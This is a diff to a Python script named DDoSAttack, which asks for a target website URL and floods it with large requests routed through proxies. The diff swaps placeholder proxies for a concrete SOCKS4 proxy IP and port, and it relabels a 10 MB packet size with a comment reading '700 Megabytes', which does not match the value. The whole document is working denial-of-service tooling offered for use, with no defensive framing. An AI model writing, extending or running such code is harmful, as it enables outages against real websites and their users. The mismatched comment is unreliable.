@@ -2,6 +2,8 @@ import requests
 import random
 import threading
 import time
+import socket 
+
 
 class DDoSAttack:
     def __init__(self, target_url, packets_per_minute, packet_size):
@@ -12,7 +14,7 @@ class DDoSAttack:
 
     def load_proxies(self):
         # Load proxies from a file or define them here
-        return ["http://proxy1.com", "http://proxy2.com", "http://proxy3.com"]
+        return ["socks4://51.68.229.179:54055"]
 
     def send_packet(self, proxy):
         try:
@@ -65,7 +67,7 @@ if __name__ == "__main__":
     try:
         target_url = input("Enter the target website URL: ")
         packets_per_minute = int(input("Enter the number of packets to send per minute: "))
-        packet_size = 10 * 1024 * 1024  # 10 Megabytes
+        packet_size = 10 * 1024 * 1024  # 700 Megabytes
 
         attack = DDoSAttack(target_url, packets_per_minute, packet_size)
         attack.attack()
@@ -75,3 +77,6 @@ if __name__ == "__main__":
         print("Attack stopped by user.")
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
+
+
+
